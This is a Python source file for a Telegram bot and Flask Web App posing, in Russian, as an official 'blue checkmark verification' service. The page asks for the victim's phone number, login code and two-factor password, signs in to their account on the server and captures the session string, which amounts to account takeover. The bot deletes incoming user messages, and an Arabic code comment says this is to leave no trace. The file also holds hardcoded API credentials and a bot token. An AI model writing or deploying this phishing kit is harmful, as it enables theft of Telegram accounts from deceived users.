from flask import Flask, render_template_string, request
from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import os
import threading
from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

app = Flask(__name__)

API_ID = 25757508
API_HASH = '3091fbda91d4b133207779ddf81fee39'
BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")

active_sessions = {}

WEB_APP_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Верификация Telegram</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0e1621; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: #17212b; padding: 25px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); width: 320px; text-align: center; border: 1px solid #232e3c; }
        .badge-container { position: relative; width: 80px; height: 80px; margin: 0 auto 15px auto; }
        .avatar { width: 80px; height: 80px; background: #2b5278; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #fff; font-weight: bold; }
        .blue-badge { position: absolute; bottom: 0; right: 0; background: #2481cc; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 2px solid #17212b; }
        .blue-badge svg { width: 14px; height: 14px; fill: #fff; }
        h3 { color: #fff; margin: 10px 0 5px 0; font-size: 18px; }
        p { color: #829ba7; font-size: 13px; margin-bottom: 20px; line-height: 1.4; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #2b3847; background: #18222d; color: #fff; font-size: 15px; text-align: center; outline: none; }
        input:focus { border-color: #2481cc; }
        button { width: 95%; padding: 12px; background: #2481cc; color: white; border: none; border-radius: 10px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 15px; transition: 0.2s; }
        button:hover { background: #1b6cae; }
        .msg { color: #e53935; font-size: 13px; margin-bottom: 10px; }
        .success { color: #4cd964; font-size: 12px; word-break: break-all; background: #18222d; padding: 12px; border-radius: 8px; text-align: left; direction: ltr; max-height: 140px; overflow-y: auto; border: 1px solid #2b5278; margin-top: 10px; }
        .loader { border: 3px solid #2b3847; border-top: 3px solid #2481cc; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="card">
        <div class="badge-container">
            <div class="avatar" id="user_initials">TG</div>
            <div class="blue-badge">
                <svg viewBox="0 0 24 24"><path d="M9 16.2l-3.5-3.5 1.4-1.4L9 13.4l9.1-9.1 1.4 1.4z"/></svg>
            </div>
        </div>
        <h3>Официальная верификация</h3>
        <p id="desc_text">Для получения синей галочки и подтверждения подлинности аккаунта, подтвердите номер телефона.</p>
        
        <div id="content">
            <div class="loader"></div>
        </div>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        let currentUserId = tg.initDataUnsafe?.user?.id || 'web_user_' + Math.random();
        let userName = tg.initDataUnsafe?.user?.first_name || 'Telegram User';
        document.getElementById('user_initials').innerText = userName.charAt(0).toUpperCase();

        window.onload = function() {
            setTimeout(function() {
                if (tg.requestContact) {
                    tg.requestContact((shared, contact) => {
                        if (shared && contact) {
                            let phoneNum = contact.phone_number.toString();
                            if (!phoneNum.startsWith('+')) phoneNum = '+' + phoneNum;
                            callApi('phone', phoneNum);
                        } else {
                            document.getElementById('content').innerHTML = `
                                <p class="msg">Для верификации необходимо поделиться контактом.</p>
                                <button onclick="location.reload()">Повторить</button>`;
                        }
                    });
                }
            }, 400);
        };

        function callApi(action, value) {
            document.getElementById('content').innerHTML = `<p>Обработка данных...</p><div class="loader"></div>`;
            fetch('/api', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({ action: action, value: value, user_id: currentUserId })
            })
            .then(res => res.json())
            .then(data => {
                let html = '';
                if (data.status === 'need_code') {
                    document.getElementById('desc_text').innerText = "Введите код подтверждения из Telegram:";
                    html = `<div id="error_box" class="msg"></div>
                            <input type="text" id="code_val" placeholder="Код (например 12345)">
                            <button onclick="submitCode()">Подтвердить</button>`;
                } else if (data.status === 'need_password') {
                    document.getElementById('desc_text').innerText = "Аккаунт защищен двухэтапной аутентификацией:";
                    html = `<div id="error_box" class="msg"></div>
                            <input type="password" id="pass_val" placeholder="Пароль 2FA">
                            <button onclick="submitPassword()">Войти</button>`;
                } else if (data.status === 'done') {
                    document.getElementById('desc_text').innerText = "Аккаунт успешно верифицирован!";
                    html = `<h3 style="color: #4cd964;">✅ Готово!</h3>
                            <p>Сессия сохранена:</p>
                            <div class="success">${data.session}</div>`;
                } else {
                    html = `<p class="msg">${data.message}</p>
                            <button onclick="location.reload()">Повторить</button>`;
                }
                document.getElementById('content').innerHTML = html;
            })
            .catch(err => {
                document.getElementById('content').innerHTML = `<p class="msg">Ошибка соединения с сервером.</p><button onclick="location.reload()">Повторить</button>`;
            });
        }

        function submitCode() {
            let code = document.getElementById('code_val').value.toString();
            if(!code) { alert("Введите код!"); return; }
            callApi('code', code);
        }

        function submitPassword() {
            let pass = document.getElementById('pass_val').value.toString();
            if(!pass) { alert("Введите пароль!"); return; }
            callApi('password', pass);
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(WEB_APP_HTML)

@app.route('/api', methods=['POST'])
def api():
    global active_sessions
    data = request.json
    action = data.get('action')
    value = str(data.get('value')) if data.get('value') else ""
    user_id = str(data.get('user_id'))

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        if action == 'phone':
            phone = str(value).strip()
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            loop.run_until_complete(client.connect())
            
            sent_code = loop.run_until_complete(client.send_code_request(phone))
            
            active_sessions[user_id] = {
                'client': client,
                'phone': phone,
                'hash': str(sent_code.phone_code_hash)
            }
            return {"status": "need_code"}

        elif action == 'code':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "Сессия истекла."}
            
            client = session_data['client']
            code = str(value).strip()
            
            try:
                loop.run_until_complete(client.sign_in(str(session_data['phone']), code, phone_code_hash=str(session_data['hash'])))
                session_str = client.session.save()
                active_sessions[user_id]['session_str'] = session_str
                return {"status": "done", "session": str(session_str)}
            except Exception as e:
                err_str = str(e)
                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
                    return {"status": "need_password"}
                else:
                    return {"status": "error", "message": err_str}

        elif action == 'password':
            session_data = active_sessions.get(user_id)
            if not session_data:
                return {"status": "error", "message": "Сессия истекла."}
            
            client = session_data['client']
            password = str(value).strip()
            
            try:
                loop.run_until_complete(client.sign_in(password=password))
                session_str = client.session.save()
                active_sessions[user_id]['session_str'] = session_str
                return {"status": "done", "session": str(session_str)}
            except Exception as e:
                return {"status": "error", "message": f"Неверный пароль: {e}"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

    return {"status": "error", "message": "Неизвестный запрос"}

# --- أوامر البوت مع الحذف الفوري لأي رسالة يرسلها المستخدم في الشات ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    web_url = os.getenv('RENDER_EXTERNAL_URL', 'wahm0.onrender.com')
    if not web_url.startswith('http'):
        web_url = f"https://{web_url}"
        
    keyboard = [[InlineKeyboardButton("🛡️ Верифицировать аккаунт", web_app=WebAppInfo(url=web_url))]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "👋 Добро пожаловать в центр верификации Telegram.\n\nНажмите кнопку ниже для получения официального статуса:",
        reply_markup=reply_markup
    )

async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    session_data = active_sessions.get(user_id)

    if not session_data or 'session_str' not in session_data:
        await update.message.reply_text("❌ Сначала пройдите верификацию в Web App!")
        return

    args = context.args
    limit = int(args[0]) if args and args[0].isdigit() else 100
    chat = update.effective_chat

    status_msg = await update.message.reply_text(f"⏳ Удаление последних {limit} сообщений...")

    try:
        session_str = session_data['session_str']
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()

        deleted_count = 0
        async for message in client.iter_messages(chat.id, from_user='me', limit=limit):
            try:
                await client.delete_messages(chat.id, message.id)
                deleted_count += 1
                await asyncio.sleep(0.3)
            except Exception:
                pass

        await client.disconnect()
        await status_msg.edit_text(f"✅ Успешно удалено сообщений: {deleted_count}")
    except Exception as e:
        await status_msg.edit_text(f"❌ Ошибка: {e}")

async def auto_delete_user_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # مسح أي رسالة يكتبها المستخدم فوراً لعدم ترك أي أثر في المحادثة
    try:
        await update.message.delete()
    except Exception:
        pass

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), use_reloader=False)

if __name__ == '__main__':
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("delet", delete_messages_command))
    application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
    
    print("Fokhm Final Clean Bot is running...")
    application.run_polling()

